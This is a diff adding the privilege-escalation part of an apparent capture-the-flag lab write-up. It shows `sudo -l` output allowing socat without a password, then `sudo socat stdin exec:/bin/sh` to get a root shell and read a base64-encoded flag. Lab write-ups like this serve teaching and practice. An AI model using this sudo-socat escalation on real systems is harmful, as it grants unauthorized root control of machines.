@@ -330,3 +330,40 @@ $ cat user.txt | base64 -d
 REDACTED
 ```
 
+## Escalating Privileges
+
+I run my usual [privilege escalation commands](/concepts/privilege_escalation.md#linux-privilege-escalation) and have some luck with `sudo -l`:
+
+```bash
+$ sudo -l
+Matching Defaults entries for elyana on ip-10-10-253-46:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User elyana may run the following commands on ip-10-10-253-46:
+    (ALL) NOPASSWD: /usr/bin/socat
+```
+
+The socat command can execute commands. So I run the following:
+
+```bash
+$ sudo socat stdin exec:/bin/sh
+```
+
+It worked. I'm in! The cursor changed to the # character to let me know that I am root.
+
+## root.txt
+
+I ran the following to get the flag:
+
+```bash
+# whoami
+root
+# cd /root
+# ls
+root.txt  snap
+# cat root.txt
+VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9
+# cat root.txt | base64 -d
+REDACTED
+```
